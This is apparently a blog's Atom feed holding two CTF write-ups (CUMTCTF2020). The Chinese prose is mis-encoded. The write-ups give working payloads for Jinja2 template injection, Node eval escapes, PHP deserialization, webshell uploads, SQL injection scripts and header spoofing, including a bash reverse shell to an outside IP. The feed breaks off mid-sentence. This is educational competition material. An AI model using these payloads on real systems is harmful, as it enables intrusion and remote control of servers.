<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dragon&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://devildragons.github.io/"/>
  <updated>2020-10-26T12:04:23.304Z</updated>
  <id>https://devildragons.github.io/</id>
  
  <author>
    <name>ç¬é­”é¾™</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CUMTCTF2020</title>
    <link href="https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/"/>
    <id>https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/</id>
    <published>2020-10-25T16:00:00.000Z</published>
    <updated>2020-10-26T12:04:23.304Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gixabzbhe8j30px0hnn2g.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gk1knho4rnj31160ajq40.jpg" alt=""><br>ç»è¿‡æµ‹è¯•ï¼Œæœ¬é¢˜æ˜¯jinja2æ¨¡æ¿æ³¨å…¥ã€‚<br>å¸¸è§çš„bypasså¥—è·¯ï¼Œæ„é€ </p><pre><code>{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__i'+'mport__')('o'+'s')|attr('popen')('cat /flag')|attr('read')()}}</code></pre><p>importå’Œosè¢«è¿‡æ»¤ï¼Œé‡‡ç”¨å­—ç¬¦æ‹¼æ¥çš„æ–¹æ³•ç»•è¿‡ã€‚</p><p>å‚è€ƒï¼š<br><a href="https://www.gem-love.com/ctf/2634.html#babyflask" target="_blank" rel="noopener" title="babyflask">https://www.gem-love.com/ctf/2634.html#babyflask</a></p><h2 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h2><p>è¯¥é¢˜å­˜åœ¨è®¸å¤šæ¼æ´ã€‚<br>å…¶ä¸­ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼š</p><pre><code>http://202.119.201.199:9002/about/index/blog/?url=file:///etc/passwdhttp://202.119.201.199:9002/about/index/index/?file=/etc/passwd</code></pre><p><code>http://202.119.201.199:9002/member/index/login</code>ä¸ºä¼šå‘˜çš„ç™»å½•ç½‘ç«™ï¼ŒçŒœæµ‹adminçš„ç™»å½•ç½‘ç«™ä¸º<code>http://202.119.201.199:9002/admin/index/login</code>ï¼Œå°è¯•è´¦å·<code>admin</code>ï¼Œå¯†ç <code>admin</code>æˆåŠŸç™»å½•ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gk2x07rf7bj318q06st91.jpg" alt=""><br>ç„¶ååœ¨æ£€æµ‹ç›®æ ‡IPä¸»æœºçŠ¶æ€ä¸­æœ‰æ¼æ´ï¼Œå¯ä»¥ç”¨|ä»è€Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚äºæ˜¯æƒ³åˆ°åœ¨ç›®å½•å†™å…¥ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gk2xdct1w4j30ip05yt8r.jpg" alt=""></p><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk2xk51ytij30ox0e5t9y.jpg" alt=""><br>ä»database.phpä¸­å¯ä»¥çŸ¥é“æ•°æ®åº“çš„ä¿¡æ¯ã€‚</p><pre><code>&lt;?php$servername = &quot;mysql&quot;;$username = &quot;root&quot;;$password = &quot;root&quot;;$dbname = &quot;yxjcms&quot;;$conn = mysqli_connect($servername, $username, $password,$dbname);if (!$conn) {  die(&quot;Connection failed: &quot; . mysqli_connect_error());}else{  echo(&quot;âœ”&quot;);}$sql = $_POST[&apos;sql&apos;];$result = $conn-&gt;query($sql);if ($result-&gt;num_rows &gt; 0) {  // è¾“å‡ºæ•°æ®  while($row = $result-&gt;fetch_assoc()) {    var_dump($row);    echo(&quot;ğŸ´â€¢â˜  &quot;); }} else {  echo &quot;âœ–&quot;;}$conn-&gt;close();?&gt;</code></pre><p>åˆ›å»ºä¸€ä¸ªæŸ¥è¯¢æ•°æ®åº“çš„mysql.phpæ–‡ä»¶ã€‚<br>ä½¿ç”¨show tablesï¼ŒæŸ¥è¯¢åˆ°flagishereè¡¨ï¼Œä½¿ç”¨select * from flagishereè·å¾—flagã€‚</p><h2 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk1l2ga4b2j31f506mt9w.jpg" alt=""><br>æŸ¥çœ‹æºç å‘ç°å¾ˆå¤šè¡¨æƒ…ï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œæ˜¯aaencodeç¼–ç ã€‚<br>ç»è¿‡aaencodeè§£å¯†å†Unicodeè§£å¯†è·å¾—é¢˜ç›®æºç ã€‚</p><pre><code> var isBegin = false;function numRand() {var x = 9999;var y = 1000;var rand = parseInt(Math.random() * (x - y + 1) + y);return rand;}function isPrimeNum(num) {return !/^.?$|^(..+?)\1+$/.test(Array(num + 1).join(&apos;1&apos;))}function check(num) {if (isPrimeNum(num)) {    $.ajax({        url: &apos;check.php&apos;,        type: &apos;POST&apos;,        data: &apos;num=&apos; + num,        success: function (data) {            alert(data);        }    })} else {    alert( &apos;It seems t&apos;    +&apos;hat you are&apos;    +&apos; not lucky &apos;    +&apos;enough, ple&apos;    +&apos;ase keep tr&apos;    +&apos;ying.&apos;)}}$(function () {var u = 265;$(&apos;.btn&apos;).click(function () {    if (isBegin) return false;    isBegin = true;    $(&quot;.num&quot;).css(&apos;background-position&apos;, &apos;11px 0&apos;);    var result = numRand();    var num_arr = (result + &apos;&apos;).split(&apos;&apos;);    $(&quot;.num&quot;).each(function (index) {        var _num = $(this);        var yPos = (u * 60) - (u * num_arr[index]);        setTimeout(function () {            _num.animate({                backgroundPosition: &apos;11px &apos; + yPos + &apos;px&apos;            }, {                duration: 6000 + index * 3000,                easing: &quot;easeInOutCirc&quot;,                complete: function () {                    if (index == 3) {                        isBegin = false;                        check(result);                    }                }            });        }, index);    });});});</code></pre><p>å®¡è®¡ä»£ç å¯çŸ¥ï¼Œåªè¦åœ¨check.phpä¸­POSTçš„4ä½numä¸ºç´ æ•°å³å¯è·å¾—flagã€‚<br>äºæ˜¯POST num=2333,å¾—åˆ°flagçš„base64ç¼–ç ã€‚</p><pre><code>Y3VtdGN0Znt3M2xjMG1lX3QwX2N1bXRjdGZfQH0=</code></pre><p>è§£ç è·å¾—flagã€‚</p><h2 id="koa-lt"><a href="#koa-lt" class="headerlink" title="koa&lt;"></a>koa&lt;</h2><p>æ‰“å¼€é¡µé¢çœ‹åˆ°ä¸€ä¸²base64ç¼–ç ï¼Œè§£ç åè·å¾—é¢˜ç›®æºç ã€‚</p><pre><code>const Koa = require(&apos;koa&apos;);const Router = require(&apos;koa-router&apos;);const Parser = require(&apos;koa-bodyparser&apos;);const fs = require(&apos;fs&apos;);let app = new Koa();let router = new Router();app.use(Parser());router.get(&apos;/&apos;, async ctx =&gt; {ctx.response.body = `&lt;html&gt;&lt;a href=&quot;/src&quot;&gt;Source Code&lt;/a&gt;&lt;/html&gt;`;});let btoa = s =&gt; new Buffer(s + &apos;&apos;).toString(encoding=&apos;base64&apos;);let atob = s =&gt; new Buffer(s + &apos;&apos;, encoding=&apos;base64&apos;).toString();const src = btoa(fs.readFileSync(&apos;app.js&apos;));router.get(&apos;/src&apos;, async ctx =&gt; {ctx.response.body = src;});let filter = expr =&gt; {let blacklist = [&apos;(&apos;, &apos;)&apos;, &apos;.&apos;, &apos;&amp;&apos;, &apos;#&apos;, &apos;\\&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos; &apos;];for (const ele of expr) {    if (blacklist.includes(ele))        return false;}return true;}router.post(&apos;/expr&apos;, async ctx =&gt; {let expr = ctx.request.body.expr || &apos;8 ^ 1&apos;;if (!filter(expr)) {    ctx.response.body = &apos;?&apos;;    return;}ctx.response.body = eval(expr);})app.use(router.routes());app.listen(9999);</code></pre><p>é¢˜ç›®ç»™äº†hint:<code>=</code>ã€‚æ‰€ä»¥å…ˆPOST</p><p>expr=   <code>filter=e=&gt;{return/**/true}</code>,è¿™æ ·ä½¿filterä¸ºtrueï¼Œå³å¯ç»•è¿‡blacklistã€‚</p><p>å› ä¸ºæœ¬é¢˜ä¸ºnodejsï¼Œç„¶åPOST </p><p>expr=<code>global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString()</code></p><p>æ‰€ä»¥è„šæœ¬ä¸ºï¼š</p><pre><code>import requestsurl=&quot;http://219.219.61.234:30000/expr&quot;res1=requests.post(url,data={&quot;expr&quot;:&quot;filter=e=&gt;{return/**/true}&quot;})print(res1.text)res2=requests.post(url,data={&quot;expr&quot;:&apos;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString()&apos;})print(res2.text)</code></pre><p>å³å¯è¯»å–flagã€‚</p><h2 id="koa-gt"><a href="#koa-gt" class="headerlink" title="koa&gt;"></a>koa&gt;</h2><p>æœ¬é¢˜å’Œä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œåªæ˜¯è¿‡æ»¤ä¸åŒã€‚</p><pre><code>const Koa = require(&apos;koa&apos;);const Router = require(&apos;koa-router&apos;);const Parser = require(&apos;koa-bodyparser&apos;);const fs = require(&apos;fs&apos;);let app = new Koa();let router = new Router();app.use(Parser());router.get(&apos;/&apos;, async ctx =&gt; {ctx.response.body = `&lt;html&gt;&lt;a href=&quot;/src&quot;&gt;Source Code&lt;/a&gt;&lt;/html&gt;`;});let btoa = s =&gt; new Buffer(s + &apos;&apos;).toString(encoding=&apos;base64&apos;);let atob = s =&gt; new Buffer(s + &apos;&apos;, encoding=&apos;base64&apos;).toString();const src = btoa(fs.readFileSync(&apos;app.js&apos;));router.get(&apos;/src&apos;, async ctx =&gt; {ctx.response.body = src;});let filter = expr =&gt; {let blacklist = [&apos;(&apos;, &apos;)&apos;, &apos;=&apos;, &apos;.&apos;, &apos;&amp;&apos;, &apos;#&apos;, &apos;\\&apos;, &apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;;&apos;, &apos; &apos;];for (const ele of expr) {    if (blacklist.includes(ele))        return false;}return true;}router.post(&apos;/expr&apos;, async ctx =&gt; {let expr = ctx.request.body.expr || &apos;8 ^ 1&apos;;if (!filter(expr)) {    ctx.response.body = &apos;?&apos;;    return;}ctx.response.body = eval(expr);})app.use(router.routes());app.listen(9999);</code></pre><p>æœ¬é¢˜ä¸ä¸Šä½“æ¯”è¾ƒï¼Œå¤šè¿‡æ»¤äº†=å’Œ&#39;ï¼Œä½†æ˜¯å°‘è¿‡æ»¤äº†ï¼Œè€Œä¸”ç»™äº†hint:  <code>tagged template</code>,<img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gk2z9mppm8j30fl01xt8j.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gk2zbgjkg3j307t043746.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk2zbshfnij30ff049mx0.jpg" alt=""><br>æœ€ç»ˆpayload:</p><pre><code>import requestsurl=&quot;http://219.219.61.234:30001/src&quot;res=requests.get(url)url = &quot;http://219.219.61.234:30001/expr&quot;headers ={&apos;test&apos;:&apos;&apos;&apos;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&apos;bash -c &quot;/bin/bash -i &gt; /dev/tcp/107.191.41.65/90 0&lt;&amp;1 2&gt;&amp;1&quot;&apos;).toString()&apos;&apos;&apos;}res=requests.post(url,data={&quot;expr&quot;:&apos;&apos;&apos;Function`s${ctx[`header`][`test`]}```&apos;&apos;&apos;},headers=headers)print(res.text)</code></pre><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gk2zfvob7bj307j02fa9v.jpg" alt=""></p><p>ç„¶ååœ¨æœåŠ¡å™¨ä¸Šå¯¹è®¾ç½®çš„ç«¯å£è¿›è¡Œç›‘å¬ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gk2zhhhn8cj30cf0gv3yr.jpg" alt=""><br>è¿è¡Œä»£ç ï¼Œåœ¨æœåŠ¡å™¨è¿è¡Œ/readflagè·å–flagã€‚</p><p>å‚è€ƒï¼š<a href="http://iv4n.cc/2020-wp-vol1/#templatejs" target="_blank" rel="noopener">http://iv4n.cc/2020-wp-vol1/#templatejs</a></p><h2 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk1m5ff1awj30de033t8j.jpg" alt=""></p><p>æŸ¥çœ‹æºç è·å¾—æç¤ºã€‚</p><pre><code>&lt;?phpClass Source {public function __toString() {    return highlight_file(&apos;license.txt&apos;, true).highlight_file($this-&gt;source, true);}}function easy_check($str) {//echo $str;if (preg_match(&quot;/flag/i&quot;, $str, $matches)) {    return false;}return true;}if(isset($_GET[&apos;source&apos;])){$s = new Source();$s-&gt;source = __FILE__;echo $s;exit;}$todos = [];if(isset($_COOKIE[&apos;todos&apos;])){if(!easy_check($_COOKIE[&apos;todos&apos;])) {    echo &quot;Hacker!\n&quot;;} else {    $c = $_COOKIE[&apos;todos&apos;];    $h = substr($c, 0, 32);    $m = substr($c, 32);    if(md5($m) === $h){        $todos = unserialize($m);    }}}if(isset($_POST[&apos;text&apos;])){$todo = $_POST[&apos;text&apos;];$todos[] = $todo;$m = serialize($todos);$h = md5($m);setcookie(&apos;todos&apos;, $h.$m);header(&apos;Location: &apos;.$_SERVER[&apos;REQUEST_URI&apos;]);exit;}// flag is in flag.php?&gt;&lt;?php foreach($todos as $todo):?&gt;&lt;li&gt;&lt;?=$todo?&gt;&lt;/li&gt;&lt;?php endforeach;?&gt;</code></pre><p>å‘ç°å’Œ <a href="https://blog.csdn.net/weixin_43415644/article/details/94590443" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43415644/article/details/94590443</a>çš„ç±»ä¼¼ï¼Œåªæ˜¯è¿‡æ»¤äº†flagã€‚</p><pre><code>&lt;?phpClass Source {public function __toString() {    highlight_file(&apos;license.txt&apos;, true).highlight_file($this-&gt;source, true);}}if(isset($_GET[&apos;source&apos;])){$s = new Source();$s-&gt;source = &quot;flag.php&quot;;$s=[$s];$m=serialize($s);echo $m;}?&gt;</code></pre><p>ç›´æ¥å†™è„šæœ¬ï¼Œè·å¾—</p><pre><code>a:1:{i:0;O:6:&quot;Source&quot;:1:{s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;}}</code></pre><p>å…¶ä¸­flagè¢«è¿‡æ»¤äº†,æ‰€ä»¥æ„é€ </p><pre><code>a:1:{i:0;O:6:&quot;Source&quot;:1:{s:6:&quot;source&quot;;S:8:&quot;\66lag.php&quot;;}}</code></pre><p>ç»•è¿‡<br>æœ€åçš„payload:</p><pre><code>df80635527eb9189c1197254ad3c46bca%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Source%22%3A1%3A%7Bs%3A6%3A%22source%22%3BS%3A8%3A%22%5C66lag.php%22%3B%7D%7D</code></pre><p>æ·»åŠ cookie todosä¸ºpayloadï¼Œç„¶ååˆ·æ–°ä¸€ä¸‹é¡µé¢è·å¾—flagã€‚</p><h2 id="WellCMS"><a href="#WellCMS" class="headerlink" title="WellCMS"></a>WellCMS</h2><p>ç»è¿‡æµ‹è¯•adminçš„å¯†ç ä¸ºadmin123ï¼Œç™»å½•åç„¶åå†æ¬¡è¾“å…¥å¯†ç è¿›å…¥åå°ç®¡ç†ç³»ç»Ÿã€‚æ–°å¢åŠ ä¸€ä¸ªå†…å®¹ï¼Œç„¶åä¸Šä¼ å›¾ç‰‡ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk1qm67qs5j30et0cpwg1.jpg" alt=""><br>æŠ“åŒ…åˆ†æå‘ç°filetypeä¸ºjpegï¼Œdataä¸ºå›¾ç‰‡çš„base64ç¼–ç ã€‚<br>filetypeä¿®æ”¹ä¸ºphpï¼Œ<br>dataä¿®æ”¹ä¸ºï¼š</p><pre><code>data:image/jpeg;base64,PD9waHAgQGV2YWwoJF9QT1NUWydoYWNrJ10pO2V2YWwocGhwaW5mbygpKTs/Pg==&lt;?php @eval($_POST[&apos;hack&apos;]);eval(phpinfo());?&gt;</code></pre><p>ç„¶åä¸Šä¼ ï¼Œæ¥ç€æ‰“å¼€ä¸Šä¼ æ–‡ä»¶<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gk1quv0f3fj30vh0mrtat.jpg" alt=""><br>æˆåŠŸè¿è¡Œã€‚æ¥ç€ç”¨èšå‰‘è¿æ¥ã€‚åœ¨æ ¹ç›®å½•ä¸‹è·å¾—flagã€‚</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/0daybug/p/12393857.html" target="_blank" rel="noopener">https://www.cnblogs.com/0daybug/p/12393857.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;babyflask&quot;&gt;&lt;a href=&quot;#babyflask&quot; class=&quot;headerlink&quot; title=&quot;bab
      
    
    </summary>
    
    
      <category term="web" scheme="https://devildragons.github.io/categories/web/"/>
    
    
      <category term="cumt" scheme="https://devildragons.github.io/tags/cumt/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF2020</title>
    <link href="https://devildragons.github.io/2020/09/25/CUMTCTF2020/"/>
    <id>https://devildragons.github.io/2020/09/25/CUMTCTF2020/</id>
    <published>2020-09-24T16:00:00.000Z</published>
    <updated>2020-10-17T08:30:09.728Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Webç­¾åˆ°"><a href="#Webç­¾åˆ°" class="headerlink" title="Webç­¾åˆ°"></a>Webç­¾åˆ°</h2><p>ä¸€å¼€å§‹æ˜¾ç¤ºGET 1,æ‰€ä»¥ä¼ å‚?1=1ï¼Œç„¶åæ˜¾ç¤ºPOST 2ï¼Œæ‰€ä»¥ä½¿ç”¨POSTæ–¹æ³•ä¼ å…¥2=2ã€‚</p><pre><code>&lt;?php error_reporting(0);if (!isset($_GET[&quot;1&quot;]))    die(&quot;Please Give me a GET 1 !&quot;);if (!isset($_POST[&quot;2&quot;]))    die(&quot;Please Give me a POST 2 !!&quot;);highlight_file(__FILE__);if (isset($_GET[&quot;file&quot;]))    echo file_get_contents($_GET[&quot;file&quot;]);//Where is the flag??&gt;</code></pre><p>çœ‹åˆ°é¢˜ç›®ä»£ç ï¼Œæœ‰æ–‡ä»¶åŒ…å«è¯­å¥ï¼Œæœ€åæ„é€ GET:?1=1&amp;file=flag.phpå’ŒPOST:2åœ¨Elementsä¸­è·å¾—flagã€‚</p><h2 id="Babysqli"><a href="#Babysqli" class="headerlink" title="Babysqli"></a>Babysqli</h2><p>æŸ¥çœ‹æºç ï¼Œå‘ç°æç¤º</p><pre><code>&lt;!-- select * from users where user=&apos;$username&apos; and password=&apos;$password&apos; --&gt;</code></pre><p>ç»è¿‡æµ‹è¯•å‘ç°æœ¬é¢˜è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨/<strong>/ç»•è¿‡ã€‚<br>POSTæ„é€ è¯­å¥`username=admin&amp;password=â€™or/</strong>/1#`<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gj335hpjlwj30hi0e8ta0.jpg" alt=""><br>é¢˜ç›®å‡ºç°å›æ˜¾ã€‚<br>è¿™é¢˜æœ‰ä¸‰ç§è§£æ³•ï¼Œä¸€æ˜¯æŠ¥é”™æ³¨å…¥ï¼ŒäºŒæ˜¯è”åˆæ³¨å…¥ï¼Œä¸‰æ˜¯ç›²æ³¨ã€‚</p><p>æŠ¥é”™æ³¨å…¥ï¼š</p><pre><code>password=&apos;or/**/extractvalue(1,concat(&apos;~&apos;,database()))#&amp;username=admin</code></pre><p>çˆ†å‡ºæ•°æ®åº“cumtctfã€‚</p><pre><code>password=&apos;or/**/extractvalue(1,concat(&apos;~&apos;,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;cumtctf&quot;)))#&amp;username=admin</code></pre><p>çˆ†å‡ºè¡¨åusersã€‚</p><pre><code>password=&apos;or/**/extractvalue(1,concat(&apos;~&apos;,(select/**/concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;users&quot;/**/limit/**/4,1)))#&amp;username=admin</code></pre><p>çˆ†å‡ºåˆ—åpasswordã€‚</p><pre><code>password=&apos;or/**/extractvalue(1,concat(&apos;~&apos;,(select/**/concat(password)/**/from/**/users/**/limit/**/7,1)))#&amp;username=admin</code></pre><p>è·å¾—flagã€‚</p><p>è”åˆæ³¨å…¥ï¼š</p><pre><code>password=&apos;/**/union/**/select/**/1,2,3,password,5,6,7,8/**/from/**/users#&amp;username=admin</code></pre><p>ç›²æ³¨ï¼š</p><pre><code>import requestsurl = &quot;http://202.119.201.197:13003/&quot;data = {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;&quot;}result = &quot;&quot;i = 0while( True ):i = i + 1 head=32tail=127while( head &lt; tail ):    mid = (head + tail) // 2    payload = &quot;\&apos;or/**/if(ord(mid((select/**/group_concat(password)/**/from/**/users),%d,1))&gt;%d,1,0)#&quot;%(i,mid)    data[&apos;password&apos;] = payload    r = requests.post(url,data=data)    if &quot;Hello&quot; in r.text :        head = mid + 1    else:        tail = midlast = resultif chr(head)!=&apos;&apos;:    result += chr(head)else:    breakprint(result)</code></pre><h2 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h2><p>æ‰“å¼€åªçœ‹åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œæ‰“å¼€æºç ä¹Ÿæ²¡æœ‰ä»€ä¹ˆï¼Œå°†å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œæ‰“å¼€å‘ç°æºç ã€‚</p><pre><code>&lt;?phperror_reporting(0);include_once(&apos;flag.php&apos;);if(isset($_GET[&apos;param1&apos;])){$str1=$_GET[&apos;param1&apos;];if(file_get_contents($str1)!==&apos;Suvin_wants_a_girlfriend&apos;)    die(&quot;Suvin doesn&apos;t like you&quot;);if(isset($_GET[&apos;param2&apos;])){    $str2=$_GET[&apos;param2&apos;];    if(!is_numeric($str2))        die(&apos;Suvin prefers strings of Numbers&apos;);    else if($str2&lt;3600*24*30)        die(&apos;Suvin says the num is too short&apos;);    else if($str2&gt;3600*24*31)        die(&apos;Suvin says the num is too long&apos;);    else {        echo &quot;Suvin says he&apos;s falling in love with you!&quot;.&quot;&lt;/br&gt;&quot;;        sleep(intval($str2));     }    if (isset($_POST[&apos;param1&apos;]) &amp;&amp; isset($_POST[&apos;param2&apos;])) {        $str1=$_POST[&apos;param1&apos;];        $str2=$_POST[&apos;param2&apos;];        if(strlen($str1)&gt;1000)            die(&quot;It&apos;s too long&quot;);        if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))            echo $flag;        else             die(&quot;It&apos;s so similar to md5&quot;);    }}}</code></pre><p>å®¡è®¡ä»£ç å¯çŸ¥æœ‰ä¸‰ä¸ªéœ€è¦ç»•è¿‡çš„ç‚¹ã€‚</p><p>ç¬¬ä¸€ä¸ªï¼Œfile_get_contentsæ¼æ´ï¼Œéœ€è¦æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶ä¸”æ–‡ä»¶å†…å®¹ä¸ºSuvin_wants_a_girlfriendã€‚æœ¬é¢˜æ²¡æœ‰ç¬¦åˆè¯¥å†…å®¹çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ä½¿ç”¨dataä¼ªåè®®ã€‚<br>æ„é€ ï¼š?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k</p><p>ç¬¬äºŒä¸ªæ˜¯è¦è®©str2=2592000,ç›´æ¥è¾“å…¥2592000çš„è¯ï¼Œä¼šä¸‹é¢çš„sleepå‡½æ•°ï¼Œéœ€è¦ç­‰å¾ˆä¹…ï¼Œä½†æ˜¯sleep(intval($str2))å¯ä»¥é‡‡ç”¨åˆ«çš„æ–¹æ³•ç»•è¿‡ï¼Œè¾“å…¥param2=2.592e6ï¼Œåªéœ€è¦sleep(2.592)å³å¯ã€‚</p><p>ç¬¬ä¸‰ä¸ªä¾¿æ˜¯</p><pre><code>if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))echo $flag;</code></pre><p>sha1è¿›è¡Œå¼ºæ¯”è¾ƒæ—¶æ˜¯å¯ä»¥é€šè¿‡æ•°ç»„ç»•è¿‡çš„ï¼Œä½†æ˜¯è¿™é‡Œå°†æ•°æ®è¿›è¡Œäº†å¼ºåˆ¶è½¬æ¢ï¼Œæ‰€ä»¥ç”¨æ•°ç»„å‰åŠéƒ¨åˆ†å°±ä¸èƒ½é€šè¿‡åˆ¤æ–­ã€‚<br>æ‰€ä»¥éœ€è¦æ‰¾åˆ°sha1ç¢°æ’ã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/caiqiiqi/article/details/68953730" target="_blank" rel="noopener">https://blog.csdn.net/caiqiiqi/article/details/68953730</a></p><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gj34g9hxu1j30tn0ig41r.jpg" alt=""><br>ç”¨æµè§ˆå™¨POSTé”™è¯¯ï¼Œæ‰€ä»¥ä½¿ç”¨burpsuiteä¼ å‚è·å¾—flagã€‚</p><h2 id="Babysqli2"><a href="#Babysqli2" class="headerlink" title="Babysqli2"></a>Babysqli2</h2><p>è¿™é¢˜æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥ä½¿ç”¨ç›²æ³¨ã€‚</p><pre><code>&lt;!-- select * from users where user=&apos;$username&apos; and password=&apos;$password&apos; --&gt;</code></pre><p>æŸ¥è¯¢è¯­å¥å’Œsql1ä¸€æ ·ï¼Œå‘ç°æœ¬é¢˜å¼•å·è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æ„é€  <code>username=admin\&amp;password=or/**/1#</code>ï¼Œ\å°†å•å¼•å·è½¬ä¹‰ï¼Œæ˜¾ç¤ºLogin successæˆåŠŸç»•è¿‡ã€‚</p><pre><code>import requestsurl = &quot;http://202.119.201.197:13004/&quot;data = {&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:&quot;&quot;}result = &quot;&quot;i = 0while( True ):i = i + 1 head=32tail=127while( head &lt; tail ):    mid = (head + tail) // 2    payload = &quot;or/**/if(ord(right((select/**/group_concat(password)/**/from/**/users),%d))&gt;%d,1,0)#&quot;%(i,mid)    data[&apos;password&apos;] = payload    r = requests.post(url,data=data)    if &quot;Login success&quot; in r.text :        head = mid + 1    else:        tail = midlast = resultif chr(head)!=&apos;&apos;:    result += chr(head)else:    breakprint(result)</code></pre><p>æœ¬é¢˜è¿‡æ»¤äº†substr,substringå’Œmidã€‚æ‰€ä»¥åªèƒ½ç”¨leftæˆ–è€…rightå‡½æ•°æˆªå–å­—ç¬¦ï¼Œè¿™é‡Œçš„è„šæœ¬ç”¨rightå‡½æ•°è·‘å‡ºçš„ç»“æœæ˜¯å€’åºçš„ï¼Œé€†è½¬ä¸€ä¸‹å³å¯ã€‚</p><h2 id="ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ"><a href="#ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ" class="headerlink" title="ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ"></a>ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ</h2><p>è¿›å»ç•Œé¢æç¤ºéœ€è¦æ¥è‡ªæœ¬åœ°ã€‚<br>æŠ“åŒ…å¢åŠ X-Forwarded-For:127.0.0.1ï¼Œæç¤º</p><pre><code>Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive</code></pre><p>å°†X-Forwarded-Forä¿®æ”¹ä¸ºClient-ipç»•è¿‡ã€‚</p><pre><code>&lt;?phpif ($_SERVER[&apos;HTTP_CLIENT_IP&apos;] != &apos;127.0.0.1&apos; &amp;&amp; $_SERVER[&apos;HTTP_X_REAL_IP&apos;] != &apos;127.0.0.1&apos;){    if ($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;] == &quot;127.0.0.1&quot;) {        die(&quot;Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive&quot;);    }    die(&quot;Sorry, this site is only optimized for those who comes from localhost&quot;);}show_source(__FILE__);include_once(&quot;flag.php&quot;);if(isset($_POST[&apos;f&apos;]))   include_once($_POST[&apos;f&apos;]);</code></pre><p>é¢˜ç›®ç»™å‡ºäº†æºç ã€‚<br>å‘ç°è¿™é¢˜å’Œwmctf2020çš„Make PHP Great 